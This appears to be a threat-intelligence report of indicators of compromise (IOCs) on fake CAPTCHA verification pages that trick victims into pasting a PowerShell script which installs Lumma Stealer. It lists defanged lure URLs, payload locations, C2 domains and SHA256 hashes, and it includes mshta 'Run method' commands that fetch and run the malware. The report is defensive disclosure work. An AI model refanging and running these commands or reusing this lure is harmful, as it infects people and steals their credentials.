@@ -1,0 +1,73 @@
+2024-08-28 (WEDNESDAY): FAKE "HUMAN CAPTCHA" STYLE VERIFICATION PAGE LEADS TO COPY/PASTE SCRIPT FOR LUMMA STEALER
+
+AUTHOR:
+
+- Paul Michaud II
+
+NOTES:
+
+- As recently as 2024-08-27, fake verification pages have been established to distribute Lumma Stealer malware.
+- These pages have a button that, when clicked, shows instructions for victims to paste PowerShell script into a Run window.
+- This copy/paste PowerShell script retrieves and runs a Windows EXE for Lumma Stealer malware.
+- The associated Lumma Stealer EXE files retrieve and use zip archives that don't appear to be inherently malicious on their own.
+- This is somewhat similar to activity that we reported in June 2024 at:
+  -- https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2024-06-24-IOCs-for-ClickFix-pushing-Lumma-Stealer.txt
+
+7 EXAMPLES OF FAKE HUMAN CAPTCHA PAGES ACTIVE AS OF 2024-08-28:
+
+- hxxps[:]//ch3.dlvideosfre[.]click/human-verify-system.html
+- hxxps[:]//get-verified.b-cdn[.]net/captcha-verify-v5.html
+- hxxps[:]//get-verified2.b-cdn[.]net/captcha-verify-v2.html
+- hxxps[:]//human-check.b-cdn[.]net/verify-captcha-v7.html
+- hxxps[:]//human-verify02.b-cdn[.]net/captcha-verify-v2.html
+- hxxps[:]//myapt67.s3.amazonaws[.]com/human-captcha-v1.html
+- hxxps[:]//myapt67.s3.amazonaws[.]com/human-verify-system.html
+
+FIRST EXAMPLE OF INFECTION TRAFFIC FROM FAKE VERIFCATION PAGE:
+
+- hxxps[:]//myapt67.s3.amazonaws[.]com/human-captcha-v1.html
+- hxxps[:]//myapt67.s3.amazonaws[.]com/pgrtmed   <-- Lumma Stealer EXE retrieved and run by copied/pasted script
+- hxxps[:]//myapt67.s3.amazonaws[.]com/pgrt1.zip
+- hxxps[:]//myapt67.s3.amazonaws[.]com/pgrt2.zip
+- hxxps[:]//iplogger.co/Zv0L8.zip   <-- parked domain, returned small, non malicious PNG image
+- tibedowqmwo.shop  <-- HTTPS Lumma Stealer C2 traffic
+
+SECOND EXAMPLE OF INFECTION TRAFFIC FROM FAKE VERIFCATION PAGE:
+
+- hxxps[:]//myapt67.s3.amazonaws[.]com/human-verify-system.html
+- hxxps[:]//myapt67.s3.amazonaws[.]com/pgrtx   <-- Lumma Stealer EXE retrieved and run by copied/pasted script
+- hxxps[:]//myapt67.s3.amazonaws[.]com/pgrt1.zip
+- hxxps[:]//myapt67.s3.amazonaws[.]com/pgrt2.zip
+- hxxps[:]//iplogger.co/Zbg73.zip   <-- parked domain, returned small, non malicious PNG image
+- tibedowqmwo.shop  <-- HTTPS Lumma Stealer C2 traffic
+
+THIRD EXAMPLE OF INFECTION TRAFFIC FROM FAKE VERIFCATION PAGE:
+
+- hxxps[:]//ch3.dlvideosfre[.]click/human-verify-system.html
+- hxxps[:]//verif.dlvideosfre[.]click/2ndhsoru   <-- Lumma Stealer EXE retrieved and run by copied/pasted script
+- hxxps[:]//verif.dlvideosfre[.]click/K1.zip
+- hxxps[:]//verif.dlvideosfre[.]click/K2.zip
+- futureddospzmvq.shop  <-- HTTPS Lumma Stealer C2 traffic
+
+THREE EXAMPOLES OF WINDOWS EXE FILES FOR LUMMA STEALER:
+
+- SHA256 hash: 07b127b0c351547fa8ec4cac6cd5fd68dc8916dc4557ab13909ca95d53478a7d
+- File size: 184,056 bytes
+- File location: hxxps[:]//myapt67.s3.amazonaws[.]com/pgrtmed
+- File type: PE32 executable (GUI) Intel 80386, for MS Windows
+- File description: Windows EXE for Lumma Stealer
+- Run method: mshta hxxps[:]//myapt67.s3.amazonaws[.]com/pgrtmed
+
+- SHA256 hash: 539574e6af31c459925943267001e2a9d61fb2c592762b5c4dcbedd90155d8a3
+- File size: 180,702 bytes
+- File location: hxxps[:]//myapt67.s3.amazonaws[.]com/pgrtx
+- File type: PE32 executable (GUI) Intel 80386, for MS Windows
+- File description: Windows EXE for Lumma Stealer
+- Run method: mshta hxxps[:]//myapt67.s3.amazonaws[.]com/pgrtx
+
+- SHA256 hash: 7d6ee310f1cd4512d140c94a95f0db4e76a7171c6a65f5c483e7f8a08f7efe78
+- File size: 201,092 bytes
+- File location: hxxps[:]//verif.dlvideosfre[.]click/2ndhsoru
+- File type: PE32 executable (GUI) Intel 80386, for MS Windows
+- File description: Windows EXE for Lumma Stealer
+- Run method: mshta hxxps[:]//verif.dlvideosfre[.]click/2ndhsoru
